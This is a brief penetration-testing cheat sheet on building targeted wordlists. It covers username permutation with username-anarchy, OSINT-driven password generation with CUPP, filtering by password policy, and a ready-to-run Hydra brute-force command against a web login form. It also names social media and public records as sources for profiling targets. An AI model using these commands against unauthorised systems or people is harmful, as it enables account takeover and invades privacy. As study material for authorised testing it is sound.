
# Custom Wordlists

Generate username permutations from a real name:

```bash
./username-anarchy <FIRST> <LAST> > <OUTFILE>
```

Build targeted password list from OSINT — interactive mode walks you through name, DOB, partner, pet, company, keywords:

```bash
cupp -i
```

Filter CUPP output to match a known password policy before running — cuts tens of thousands of useless candidates. Tweak the regex chains to match whatever policy you've enumerated:

```bash
grep -E '^.{6,}$' <OUTFILE> | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > <OUTFILE_FILTERED>
```

Feed both into Hydra:

```bash
hydra -L <WORDLIST_U> -P <WORDLIST_P> <TARGET> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

> [!tip] Enumerate the password policy before generating — filter early, the keyspace explodes fast (14 users × 46k passwords = 650k attempts before filtering)

OSINT sources worth hitting before CUPP: LinkedIn, Facebook, company site bios, public records, news articles. The more fields you fill, the more relevant the list.